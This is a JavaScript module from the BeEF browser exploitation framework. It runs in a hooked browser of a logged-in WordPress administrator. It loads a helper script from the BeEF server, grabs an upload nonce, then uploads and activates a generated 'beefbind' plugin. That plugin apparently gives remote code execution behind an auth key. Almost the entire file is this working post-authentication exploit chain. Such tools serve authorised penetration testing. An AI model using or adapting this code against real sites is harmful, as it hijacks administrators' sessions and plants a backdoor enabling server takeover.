/*
  Copyright (c) Browser Exploitation Framework (BeEF) - http://beefproject.com
  See the file 'doc/COPYING' for copying permission
  
  This is a rewrite of the original module misc/wordpress_post_auth_rce.

  Original Author: Bart Leppens
  Rewritten by Erwan LR (@erwan_lr | WPScanTeam)
*/

beef.execute(function() {
  beef_command_url = '<%= @command_url %>';
  beef_command_id  = <%= @command_id %>;

  // Adds wp.js to the DOM so we can use some functions here
  if (typeof get_nonce !== 'function') {
    var wp_script = document.createElement('script');

    wp_script.setAttribute('type', 'text/javascript');
    wp_script.setAttribute('src', beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/wp.js');
    var theparent = document.getElementsByTagName('head')[0];
    theparent.insertBefore(wp_script, theparent.firstChild);
  }

  var wp_path = '<%= @wp_path %>';
  var upload_nonce_path = '<%= @wp_path %>wp-admin/plugin-install.php?tab=upload';
  var upload_plugin_path = '<%= @wp_path %>wp-admin/update.php?action=upload-plugin';

  function upload_and_active_plugin(nonce) {
    var boundary = "BEEFBEEF";
    
    var post_data = "--" + boundary + "\r\n";
    post_data += "Content-Disposition: form-data; name=\"_wpnonce\"\r\n";
    post_data += "\r\n";
    post_data += nonce + "\r\n";
    post_data += "--" + boundary + "\r\n";
    post_data += "Content-Disposition: form-data; name=\"_wp_http_referer\"\r\n";
    post_data += "\r\n" + upload_nonce_path + "\r\n";
    post_data += "--" + boundary + "\r\n";
    post_data += "Content-Disposition: form-data; name=\"pluginzip\";\r\n";
    post_data += "filename=\"beefbind.zip\"\r\n";
    post_data += "Content-Type: application/octet-stream\r\n";
    post_data += "\r\n";
    post_data += "<%= Wordpress_upload_rce_plugin.generate_zip_payload(@auth_key) %>";
    post_data += "\r\n";
    post_data += "--" + boundary + "--\r\n"

    post_as_binary(
      upload_plugin_path,
      boundary,
      post_data,
      function(xhr) {
        result = xhr.responseXML.getElementsByClassName('wrap')[0];

        if (result == null) {
          log('Could not find result of plugin upload in response', 'error');
        }
        else {
          result_text = result.innerText;

          if (/Plugin installed successfully/i.test(result_text)) {
            //log('Plugin installed successfully, activating it');

            // Get URL to active the plugin from response, and call it
            // <div class="wrap">...<a class="button button-primary" href="plugins.php?action=activate&amp;plugin=beefbind%2Fbeefbind.php&amp;_wpnonce=d13218642e" target="_parent">Activate Plugin</a>

            activation_tag = result.getElementsByClassName('button-primary')[0];

            if (activation_tag == null) {
              log('Plugin installed but unable to get activation URL from output', 'error');
            }
            else {
              activation_path = '<%= @wp_path %>wp-admin/' + activation_tag.getAttribute('href');

              get(activation_path, function(xhr) {
                result_text = xhr.responseXML.getElementById('message').innerText;

                if (/plugin activated/i.test(result_text)) {
                  log('Plugin installed and activated! - Auth Key: <%= @auth_key %>', 'success');
                }
                else {
                  log('Error while activating the plugin: ' + result_text, 'error');
                }
              });
            }
          }
          else {
            log('Error while installing the plugin: ' + result_text, 'error');
          }
        }
      }
    );
  }
  
  // Timeout needed for the wp.js to be loaded first
  setTimeout(
    function() {
      get_nonce(
        upload_nonce_path,
        '_wpnonce',
        function(nonce) { upload_and_active_plugin(nonce) }
      )
    },
    300
  );
});

